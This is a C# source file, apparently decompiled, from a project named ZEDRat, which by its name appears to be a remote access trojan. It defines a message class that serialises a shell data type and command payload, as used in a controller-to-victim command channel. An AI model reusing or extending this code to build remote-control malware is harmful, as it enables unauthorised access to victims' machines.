using System.IO;

namespace ZEDRatApp.ZEDRAT.Messages
{
	public class RemoteOther_Messages
	{
		public string _ShellDataType;

		public byte[] _Payload;

		public RemoteOther_Messages()
		{
		}

		public RemoteOther_Messages(string ShellDataType, byte[] Command)
		{
			this._ShellDataType = ShellDataType;
			this._Payload = Command;
		}

		public static byte[] ClassToByte(object ob)
		{
			RemoteOther_Messages remoteOther_Messages = (RemoteOther_Messages)ob;
			using MemoryStream memoryStream = new MemoryStream();
			using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
			binaryWriter.Write(remoteOther_Messages._ShellDataType);
			binaryWriter.Write((uint)remoteOther_Messages._Payload.Length);
			binaryWriter.Write(remoteOther_Messages._Payload);
			return memoryStream.ToArray();
		}

		public static RemoteOther_Messages ByteToClass(byte[] b)
		{
			RemoteOther_Messages remoteOther_Messages = new RemoteOther_Messages();
			using MemoryStream input = new MemoryStream(b);
			using BinaryReader binaryReader = new BinaryReader(input);
			remoteOther_Messages._ShellDataType = binaryReader.ReadString();
			remoteOther_Messages._Payload = binaryReader.ReadBytes((int)binaryReader.ReadUInt32());
			return remoteOther_Messages;
		}
	}
}
